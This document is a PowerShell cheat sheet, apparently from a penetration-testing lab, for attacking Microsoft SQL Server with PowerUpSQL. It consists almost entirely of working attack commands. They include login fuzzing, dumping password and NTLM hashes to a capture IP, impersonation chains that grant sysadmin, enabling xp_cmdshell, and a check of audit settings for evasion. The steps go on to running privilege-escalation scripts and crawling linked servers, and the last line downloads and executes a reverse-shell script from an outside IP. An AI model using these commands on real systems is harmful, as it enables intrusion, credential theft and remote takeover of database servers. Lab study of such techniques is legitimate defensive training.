## Discovery
# Look at every port running 1433 and see what we got
[System.Data.Sql.SqlDataSourceEnumerator]::Instance.GetDataSources()
# You can use Invoke-Portscan
Invoke-PortScan -StartAddress 192.168.0.2 -EndAddress 192.168.0.5 -ScanPort -Verbose
# If you are on a box that already has sql server, you can do local enumeration
Import-Module -Name SQLPS
Get-ChildItem SQLServer:\SQL\Get-ChildItem UFC-SQLDev
# Local Enum
Get-SErvice -Name MSSQL*
# Domain Scanning





###Power-upSQL Commands
Import-Module .\PowerUpSQL.ps1

# Enumerate
$Targets = Get-SQLInstanceDomain -Verbose | Get-SQLConnection
TestThreaded -Verbose -Threads 10 | Where-Object {$_.status -like "Accessible"}
$Targets | Get-SQLServerInfo
Get-SQLInstanceLocal -Verbose
# Enumerate Shared Accounts
Get-SQLInstanceDomain -Verbose | Group-Object DomainAccount
Get-SQLInstanceDomain -Verbose -DomainAccount db1user


# See targets
$Targets | Get-SQLServerInfo -Verbose
$Targets | Get-SQLDatabase

# Fuzz the target for logins
Get-SQLFuzzServerLogin -Verbose -Instance UFC-SQLDev
Get-SQLFuzzDomainAccount -Verbose -Instance UFC-SQLDev
#Check for weak login passwords
Invoke-SQLAuditWeakLoginPw -Verbose -Instance UFC-SQLDev
Get-SQLInstanceLocal | Invoke-SQLAuditWeakLoginPw -Verbose

#Dump them
Get-SQLServiceAccountPwHashes -Verbose -TimeOut 2 -CaptureIp 192.168.50.149
# keywords to look for in columns
$targets | Get-SQLColumnSampleDataThreaded -Verbose -SampleSize 2 -Keywords "password,NTLM" -NoDefaults | ft -AutoSize


#check for Privileges
$Targets | Get-SQLServerInfo -Verbose | Select-Object Instance.IsSyadmin -Unique
#impersonate
Invoke-SQLImpersonateService -Verbose -Instance UFC-SQLDev\UFC-SQLDev

#Escalate!
Invoke-SQLEscalatePriv -Verbose -Instance UFC-SQLDev.us.funcorp.local
#validate privs by running "check for privileges" above
#Escalate again. You can get the ip address from running Get-NetSession -ComputerName, is where the attack should send info
Invoke-SQLUncPathInjection -Verbose -CaptureIp 192.168.50.149
# If that works, then a bunch of yellow NTLM hases are dumped. If no output, didn't work.
# If you save the above output, then you can do this:
$output | select netntlmv2

#Defense Evasion - Check for auditing
Get-SQLAuditServerSpec
Get-SQLAuditDatabaseSpec

## Privesc
Get-SQLInstanceDomain
Get-SQLServerInfo -Verbose -Instance UFC-SQLDev.us.funcorp.local
# if you are running as domain admin but need to impersonate, then do:
Invoke-SQLImpersonateService -Verbose -Instance UFC-SQLDev.us.funcorp.local
# once complete with elevated privileges, you can revert back
Invoke-SQLImpersonateService -Verbose -Rev2Self

##Remote Code Execution
Invoke-SQLOSCmdOle -Verbose -Command whoami -Instance UFC-SQLDev -Username db1user -Password "password" 

# Try using some sql commands
Get-SQLQuery -Instance "UFC-SQLDev" -Query "SELECT DISTINCT b.name from sys.server_permissions a inner join sys.server_principals b on a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'"
# that returns who you can impersonate, so now lets elevate
Get-SQLQuery -Instance "UFC-SQLDev" -Query "EXECUTE as LOGIN = 'dbuser'; SELECT IS_SRVROLEMEMBER('sysadmin');"
# Can I chain the users together?
Get-SQLQuery -Instance "UFC-SQLDev" -Query "EXECUTE as LOGIN = 'dbuser'; EXECUTE as LOGIN = 'sa'; SELECT IS_SRVROLEMEMBER('sysadmin');"
# Now let's add our ability to execute 
Get-SQLQuery -Instance "UFC-SQLDev" -Query "EXECUTE as LOGIN = 'dbuser'; EXECUTE as LOGIN = 'sa'; EXEC sp_addsrvrolemember 'USFUN\pastudent149','sysadmin';"
# Did it work? If it is a one, you win!
Get-SQLQuery -Instance "UFC-SQLDev" -Query "SELECT IS_SRVROLEMEMBER('sysadmin');"
# Enable xp_cmdshell
Get-SQLQuery -Instance "UFC-SQLDev" -Query "EXEC sp_configure 'show advanced options',1; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;"
# Now you can execute from the command line
Get-SQLQuery -Instance "UFC-SQLDev" -Query "EXEC master..xp_cmdshell 'whoami';"
# Now copy over the files you want to execute
Get-SQLQuery -Instance "UFC-SQLDev" -Query "EXEC master..xp_cmdshell 'dir C:\Temp';"
Get-SQLQuery -Instance "UFC-SQLDev" -Query "EXEC master..xp_cmdshell 'dir C:\Users';"
Get-SQLQuery -Instance "UFC-SQLDev" -Query "EXEC master..xp_cmdshell 'dir C:\Users\MSSQLSERVER';"
Get-SQLQuery -Instance "UFC-SQLDev" -Query "EXEC master..xp_cmdshell 'icacls C:\Users\MSSQLSERVER\Documents';"
Get-SQLQuery -Instance "UFC-SQLDev" -Query "EXEC master..xp_cmdshell 'xcopy \\PA-USER149\shared\PowerUp.ps1 C:\Users\MSSQLSERVER\Documents';"
Get-SQLQuery -Instance "UFC-SQLDev" -Query "EXEC master..xp_cmdshell 'powershell . C:\Users\MSSQLSERVER\Documents\PowerUp.ps1; Invoke-AllChecks';"
Get-SQLQuery -Instance "UFC-SQLDev" -Query "EXEC master..xp_cmdshell 'powershell . C:\Users\MSSQLSERVER\Documents\PowerUp.ps1; Invoke-ServiceAbuse -Name ''ALG'' -Username USFUN\pastudent149';"

#Iterate through tables
Get-SQLQuery -Instance "UFC-SQLDev" -Query "SELECT * FROM information_schema.tables;"
GEt-sQLQuery -Instance "UFC-SQLDEv" -Query "SELECT name from sys.server_principals;"
GEt-sQLQuery -Instance "UFC-SQLDEv" -Query "SELECT * from information_schema.tables;"
Get-sqlQuery -Instance "UFC-SQLDev" -Query "SELECT * FROM sys.objects ;"
Get-SQLQuery -Instance "UFC-SQLDev" -Query "SELECT name FROM sys.databases;"
Get-SQLQuery -Instance "UFC-SQLDev" -Query "SELECT name, password_hash FROM sys.sql_logins;"
Get-SQLQuery -Instance "UFC-SQLDev" -Query "Use tempdb; SELECT * FROM information_schema.tables;"
Get-SQLQuery -Instance "UFC-SQLDev" -Query "Use tempdb; SELECT TABLE_NAME FROM information_schema.tables;"
Get-SQLQuery -Instance "UFC-SQLDev" -Query "Use tempdb; SELECT * FROM #A4C4CDDB;"
Get-SQLQuery -Instance "UFC-SQLDev" -Query "Use DeveloperInformation; SELECT TABLE_NAME FROM information_schema.tables;" 
Get-SQLQuery -Instance "UFC-SQLDev" -Query "Use DeveloperInformation; SELECT * FROM API;"  # Winner, found a flag here!

Get-SQLQuery -Instance "UFC-SQLDev" -Query "Use DeveloperInformation; SELECT TABLE_NAME FROM information_schema.tables;" | ForEach-Object { $_.TABLE_NAME }
Get-SQLQuery -Instance "UFC-SQLDev" -Query "Use DeveloperInformation; SELECT TABLE_NAME FROM information_schema.tables;" | ForEach-Object { Get-SQLQuery -Instance "UFC-SQLDev" -Query "Use DeveloperInformation; SELECT * FROM $_.TABLE_NAME;" }

### Are there any trust abuse options
# Are there any links in the database that link to other databases?
Get-SQLServerLinkCrawl -Instance UFC-SQLDev -Verbose
# If you can, now you know who to be on each box as you move across
Get-SQLServerLinkCrawl -INstance UFC-SQLDev -Query "exec master..xp_cmdshell 'whoami'" | ft
# Can I chain the users together?
Get-SQLQuery -Instance "UFC-SQLDev" -Query "EXECUTE as LOGIN = 'dbuser'; EXECUTE as LOGIN = 'sa';EXEC sp_addsrvrolemember 'USFUN\pastudent149','sysadmin'; "
Get-SQLQuery -Instance "UFC-SQLDev" -Query "SELECT IS_SRVROLEMEMBER('sysadmin');"
Get-SQLQuery -Instance "UFC-SQLDev" -Query "select * from Query -Instance 'UFC-SQLDev' -Query 'select * from openquery(''ufc-db1'', ''execute as login = 'sa';EXEC sp_addsrvrolemember 'USFUN\pastudent149','sysadmin';'')";
Get-SQLServerLinkCrawl -Instance UFC-SQLDev -Query "exec master..xp_cmdshell 'powershell iex(New-Object Net.WEbClient).DownloadString(''https://192.168.50.149/RevShell.ps1'')'" | ft